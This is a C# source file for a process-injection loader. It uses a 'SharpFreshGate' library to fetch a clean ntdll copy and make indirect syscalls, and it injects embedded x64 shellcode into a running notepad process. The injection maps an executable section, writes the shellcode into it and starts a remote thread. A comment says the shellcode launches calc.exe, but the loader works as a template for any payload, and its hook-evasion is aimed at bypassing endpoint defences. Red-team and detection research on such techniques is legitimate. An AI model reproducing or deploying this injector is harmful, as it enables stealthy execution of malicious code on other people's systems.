using SharpFreshGate.Core;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace FreshyCalls_RemoteMappingInjection
{
    class RemoteMappingInjection
    {
        public const string TARGET = "notepad";
        //calc.exe shellcode
        byte[] shellcode = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,
                0x65,0x78,0x65,0x00
            };

        public void Loader()
        {
            // Handle to target process
            var targetProcess = Process.GetProcessesByName(TARGET)[0];
            Console.WriteLine($"[*] Target process: {targetProcess.ProcessName} (PID: {targetProcess.Id})");

            // get fresh ntdll base
            var freshBase = FreshNtdll.GetCleanNtdllBase();
            SyscallResolver.Initialize();
            IndirectSyscall.Initialize();

            // section for shellcode
            IntPtr sectionHandle;
            long maxSize = shellcode.Length;
            int status = IndirectSyscall.NtCreateSection(
                out sectionHandle, 
                0x10000000, // SECTION_ALL_ACCESS
                IntPtr.Zero, 
                ref maxSize, 
                0x40, // PAGE_EXECUTE_READWRITE
                0x8000000,  // SEC_COMMIT
                IntPtr.Zero);
            
            if (status != 0)
            {
                Console.WriteLine($"[-] NtCreateSection failed. NTSTATUS: 0x{status:X8}");
                return;
            }
            Console.WriteLine($"[+] Section created. Handle: 0x{sectionHandle.ToString("X")}");

            // map to target process with execute permissions
            IntPtr baseAddress = IntPtr.Zero;
            ulong viewSize = (ulong)shellcode.Length;
            status = IndirectSyscall.NtMapViewOfSection(
                sectionHandle,
                targetProcess.Handle,
                out baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out viewSize,
                2, // ViewUnmap
                0,
                0x40); // PAGE_EXECUTE_READWRITE - need execute permission from the start
            
            if (status != 0)
            {
                Console.WriteLine($"[-] NtMapViewOfSection failed. NTSTATUS: 0x{status:X8}");
                return;
            }
            Console.WriteLine($"[+] Section mapped at 0x{baseAddress.ToString("X")} in target process");

            // write shellcode
            uint bytesWritten = 0;
            status = IndirectSyscall.NtWriteVirtualMemory(
                targetProcess.Handle,
                baseAddress,
                Marshal.UnsafeAddrOfPinnedArrayElement(shellcode, 0),
                (uint)shellcode.Length,
                out bytesWritten);
            
            if (status != 0)
            {
                Console.WriteLine($"[-] NtWriteVirtualMemory failed. NTSTATUS: 0x{status:X8}");
                return;
            }
            Console.WriteLine($"[+] Wrote {bytesWritten} bytes of shellcode");

            // Create a remote thread to execute shellcode
            IntPtr threadHandle;
            status = IndirectSyscall.NtCreateThreadEx(
                out threadHandle,
                0x1FFFFF, // THREAD_ALL_ACCESS
                IntPtr.Zero,
                targetProcess.Handle,
                baseAddress, // Start at shellcode address
                IntPtr.Zero, // No argument
                0, // CREATE_SUSPENDED = 0 (run immediately)
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);
            
            if (status != 0)
            {
                Console.WriteLine($"[-] NtCreateThreadEx failed. NTSTATUS: 0x{status:X8}");
                return;
            }
            
            Console.WriteLine($"[+] Remote thread created successfully! Thread handle: 0x{threadHandle.ToString("X")}");
            Console.WriteLine($"[+] Shellcode should be executing in target process now!");
        }

        static void Main(string[] args)
        {
            RemoteMappingInjection remoteMappingInjection = new RemoteMappingInjection();
            remoteMappingInjection.Loader();
        }
    }
}
